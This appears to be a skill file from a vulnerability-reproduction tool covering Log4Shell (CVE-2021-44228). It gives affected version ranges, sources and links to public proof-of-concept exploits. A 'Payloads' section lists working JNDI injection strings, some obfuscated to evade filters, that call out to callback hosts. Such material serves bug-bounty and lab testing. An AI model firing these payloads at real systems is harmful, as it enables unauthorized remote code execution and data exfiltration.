---
# bughive-repro-start
cve: CVE-2021-44228
repro: verified-public
references:
  - source: nvd
    url: "https://services.nvd.nist.gov/rest/json/cves/2.0?cveId=CVE-2021-44228"
    gave: "descriptions, configurations, 20 Exploit-tagged refs"
  - source: vendor
    url: "https://logging.apache.org/log4j/2.x/security.html"
    gave: "advisory page fetched; no concrete input copied"
  - source: ghsa
    url: "https://github.com/advisories/GHSA-jfh8-c2jp-5v3q"
    gave: "package range, first_patched_version, references"
  - source: cisa-kev
    url: "https://www.cisa.gov/sites/default/files/feeds/known_exploited_vulnerabilities.json"
    gave: "dateAdded 2021-12-10, dueDate 2021-12-24, knownRansomwareCampaignUse=Known"
  - source: exploitdb
    url: "https://gitlab.com/exploit-database/exploitdb/-/blob/main/exploits/java/remote/51183.txt"
    gave: "public PoC (EDB-51183)"
  - source: poc-in-github
    url: "https://github.com/fullhunt/log4j-scan"
    gave: "public PoC repository"
# bughive-repro-end
---

# SKILL: log4shell
## Trigger
Java + Log4j ≤ 2.14.1. Any log-stored field: User-Agent, Referer, X-Api-Version, search, contact.
## Payloads
${jndi:ldap://xxx.burpcollaborator.net/a}
${jndi:ldap://x${hostName}.L4J.canarytokens.com/a}
${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://collab/a}
${${::-j}ndi:rmi://collab/ass}
${jndi:rmi://collab}
${${lower:jndi}:${lower:rmi}://collab/poc}
${${lower:${lower:jndi}}:${lower:rmi}://collab/poc}
${${lower:j}${lower:n}${lower:d}i:${lower:rmi}://collab/poc}
${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://collab/poc
## Triage
Callback → Critical. RCE → Critical.

<!-- bughive-repro-start -->
## Steps to reproduce

> Status: `repro: verified-public` — every line below is backed by a cited reference. Nothing here was invented.

### Prerequisites
- Affected product from NVD CPE: siemens 6bk1602-0aa12-0tp0_firmware < 2.7.0; siemens 6bk1602-0aa22-0tp0_firmware < 2.7.0; siemens 6bk1602-0aa32-0tp0_firmware < 2.7.0. NVD lists 333 vulnerable CPE matches; showing 3. [[nvd](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)]
- GitHub Advisory package range: maven `org.apache.logging.log4j:log4j-core` >= 2.13.0, < 2.15.0; first patched 2.15.0; maven `org.apache.logging.log4j:log4j-core` >= 2.4, < 2.12.2; first patched 2.12.2; maven `com.guicedee.services:log4j-core` <= 1.2.1.2-jre17. [[ghsa](https://github.com/advisories/GHSA-jfh8-c2jp-5v3q)]
- Weakness: CWE-20, CWE-400, CWE-502. [[nvd](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)]

### Input / trigger
- NVD characterizes the trigger as remote code execution. No concrete request string from the advisory was copied. The linked public PoC is the input source; its body was not copied into this skill. [[nvd](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)] [[exploitdb](https://gitlab.com/exploit-database/exploitdb/-/blob/main/exploits/java/remote/51183.txt)]

### Expected (patched) vs vulnerable behavior
- Vulnerable builds match the cited range and NVD characterizes the issue as remote code execution. Structured affected range: siemens 6bk1602-0aa12-0tp0_firmware < 2.7.0. GHSA first patched version: 2.15.0. Patched builds are those outside that range. The advisory text was paraphrased, not copied. [[nvd](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)] [[ghsa](https://github.com/advisories/GHSA-jfh8-c2jp-5v3q)]

### How to confirm
- Against a disposable lab build inside the cited affected range, compare it with a build at the cited patched version by following the linked public PoC. Do not run untrusted PoC code against production. [[nvd](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)] [[exploitdb](https://gitlab.com/exploit-database/exploitdb/-/blob/main/exploits/java/remote/51183.txt)]

### Public PoC (if any)
- EDB-51183 (verified flag 0): https://gitlab.com/exploit-database/exploitdb/-/blob/main/exploits/java/remote/51183.txt
- EDB-50592 (verified flag 0): https://gitlab.com/exploit-database/exploitdb/-/blob/main/exploits/java/remote/50592.py
- EDB-50590 (verified flag 0): https://gitlab.com/exploit-database/exploitdb/-/blob/main/exploits/java/remote/50590.py
- GHSA-listed: https://github.com/tangxiaofeng7/apache-log4j-poc
- GHSA-listed: https://www.cisa.gov/known-exploited-vulnerabilities-catalog?field_cve=CVE-2021-44228
- Highest-star PoC-in-GitHub repository (unvetted; not executed): https://github.com/fullhunt/log4j-scan
- Additional repos indexed by PoC-in-GitHub for this id (unvetted): https://raw.githubusercontent.com/nomi-sec/PoC-in-GitHub/master/2021/CVE-2021-44228.json
- NVD Exploit-tagged reference: http://packetstormsecurity.com/files/165261/Apache-Log4j2-2.14.1-Information-Disclosure.html
- NVD Exploit-tagged reference: http://packetstormsecurity.com/files/165270/Apache-Log4j2-2.14.1-Remote-Code-Execution.html

### What's missing
- (none for verified-public)
<!-- bughive-repro-end -->
